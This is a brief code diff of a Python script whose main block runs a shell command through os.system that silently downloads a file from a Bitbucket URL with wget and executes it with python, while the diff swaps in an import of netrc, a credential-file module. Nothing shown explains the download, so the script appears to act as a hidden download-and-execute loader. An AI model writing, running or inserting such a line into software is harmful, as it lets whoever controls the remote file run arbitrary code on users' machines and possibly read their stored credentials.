@@ -1,4 +1,4 @@
-import os, sys,shutil
-q=14
+import os, sys,netrc
+h=2
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
